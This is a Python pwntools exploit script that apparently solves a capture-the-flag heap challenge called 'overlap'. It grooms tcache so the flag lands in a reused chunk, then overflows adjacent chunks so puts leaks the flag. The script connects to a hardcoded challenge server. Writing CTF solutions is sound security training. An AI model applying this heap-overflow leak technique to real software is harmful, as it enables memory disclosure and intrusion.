#!/usr/bin/env python3
"""
Challenge: overlap
Category:  pwn
Vuln:      16-byte heap overflow (ptr_size_table stores size+0x10)
Strategy:  Alloc A,B,C,X,D(0x2b0),E. Free D → tcache. Trigger 'f' → flag reuses D.
           Overflow X into D_size (non-null). Overflow C into X_header (non-null).
           Read C → puts chains through C,X_header,X_data,D_size into D_data = flag.
"""
from pwn import *
import re

BINARY = "./overlap"
HOST, PORT = "46.225.117.62", 30000

context.binary = ELF(BINARY, checksec=False)
context.log_level = 'info'

def get_io():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BINARY)

io = get_io()

def wait_menu():
    io.recvuntil(b'option: \n')

def malloc(size):
    io.sendline(b'1')
    io.recvuntil(b'size: \n')
    io.sendline(str(size).encode())
    wait_menu()

def free(idx):
    io.sendline(b'2')
    io.recvuntil(b'(0-9): \n')
    io.sendline(str(idx).encode())
    wait_menu()

def write_chunk(idx, data):
    io.sendline(b'4')
    io.recvuntil(b'(0-9): \n')
    io.sendline(str(idx).encode())
    io.recvuntil(b'text:\n')
    io.sendline(data)
    wait_menu()

def flag_cmd():
    io.sendline(b'f')
    wait_menu()

wait_menu()

# Heap layout: A(0) B(1) C(2) X(3) D(4) E(5)
# All 0x18 except D=0x2b0 (chunk 0x2c0, same as flag alloc)
malloc(0x18)   # idx 0 - A
malloc(0x18)   # idx 1 - B
malloc(0x18)   # idx 2 - C (read target)
malloc(0x18)   # idx 3 - X (bridge between C and D)
malloc(0x2b0)  # idx 4 - D (same tcache bin as flag)
malloc(0x18)   # idx 5 - E guard

free(4)        # D → tcache[0x2c0]
flag_cmd()     # malloc(0x2b1) reuses D, writes flag

# Overflow X(3): write 0x20 bytes = X_data(0x18) + D_size(0x8)
# Does NOT touch D_data (flag). D_size gets non-null bytes.
write_chunk(3, b'\x42' * 0x20)

# Overflow C(2): write 0x28 bytes = C_data(0x18) + X_header(0x10)
# Bridges C through X's prev_size + size with non-null.
write_chunk(2, b'\x42' * 0x28)

# Read C(2): puts reads 0x40 non-null bytes then flag data
io.sendline(b'3')
io.recvuntil(b'(0-9): \n')
io.sendline(b'2')
sleep(0.5)
data = io.recv(4096, timeout=3)

# Strip padding, extract flag
pad_end = 0
for i, b in enumerate(data):
    if b != 0x42:
        pad_end = i
        break
flag_data = data[pad_end:].split(b'\n')[0]
log.info(f"Padding: {pad_end} bytes")
log.info(f"Flag data: {flag_data}")

m = re.search(rb'[\w]+\{[^\}]+\}', flag_data)
if m:
    log.success(f"FLAG: {m.group().decode()}")
else:
    log.warn(f"No flag pattern. Raw: {data}")

io.close()
